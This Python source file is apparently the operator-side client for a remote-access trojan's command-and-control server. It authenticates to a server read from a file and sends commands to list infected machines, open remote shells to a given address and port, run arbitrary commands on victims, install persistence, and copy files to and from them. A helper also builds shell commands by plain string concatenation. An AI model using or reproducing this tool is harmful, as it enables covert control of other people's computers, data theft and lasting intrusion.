#!/usr/bin/python3
import hashlib
import requests
import os

from requests.api import head

class admin:
    def __init__(self,password):
        file=open("serverLink.txt", mode="r")
        self.status=[]
        self.password = hashlib.sha512( str(password).encode("utf-8") ).hexdigest()
        for line in file:
            self.addr = line
        file.close()

    def doRequest(self,json,rote = "/admin",  file = ""):
        addr = self.addr +  rote
        try:
            if (file == ""):
                r=requests.post(addr,headers={"x-passwd":self.password},json=json)
            else:
                with open (file,'rb') as f:
                    r=requests.post(addr,headers={"x-passwd":self.password},files={"lFile":f})
            print(r.json()['status'])
            self.status = r.json()['status']

            return (r.status_code==200)
        except Exception as e:
            print("exception ocurred!",e)
            return False
 
    def localFile(self,lFile):
        fileTrash="dir.txt"
        if (lFile == fileTrash):
            fileTrash = "trash.txt"
        os.system("ls -l | grep -v \"drw\" | awk '{print $9}' 1>>"+fileTrash)
        file=open(fileTrash, mode="r")
        saida = False
        for line in file:
            line =line.strip()
            if line==lFile:
                saida=True
        file.close()
        os.system("rm " + fileTrash)
        return saida
    
    def listFileServer(self):
        json={"CMD":"lisFileServer"}
        addr = self.addr + "/admin"
        r=requests.post(addr,headers={"x-passwd":self.password},json=json)
        return (r.json()['status'])

    #RPCS CALLS
    def displayClients(self):
        json={"CMD":"displayClients"}
        return self.doRequest(json)

    def abrirShell(self,uid,addr,port):
        json={"CMD":"abrirShell","uid":uid,"port":str(port),"addr":addr}
        return self.doRequest(json)

    def runCommand(self,cmd,uid=0):
        json={"CMD":"runCommand","cmdString":cmd,"uid":uid}
        return self.doRequest(json)
    
    def install(self,uid=0):
        json={"CMD":"installPersistency","uid":uid}
        return self.doRequest(json)

    def testServer(self):
        json={"CMD":"testServer"}
        return self.doRequest(json)

    def testClient(self,uid=0):
        json={"CMD":"testClient","uid":uid}
        return self.doRequest(json)
    
    def sendFile2Server(self,lFile):
        return self.doRequest({},"/sendFile2Server",lFile)

    def receiveFromServer(self,sFile):
        json={"sFile":sFile}
        addr = self.addr + "/receiveFromServer"
        r = requests.get(addr,json=json,headers={"x-passwd":self.password}, allow_redirects=True)
        open(sFile,'wb').write(r.content)
        return r.status_code==200

    def fileServer2Client(self,csFile,uid):
        json={"CMD":"fileServer2Client","uid":uid,"csFile":csFile}
        return self.doRequest(json)

    def fileClient2Server(self,scFile,uid):
        json={"CMD":"fileClient2Server","uid":uid,"scFile":scFile}
        return self.doRequest(json)

    def runCommandInServer(self, cmd):
        json={"CMD":"runComandLocal","cmdL":cmd}
        return self.doRequest(json)
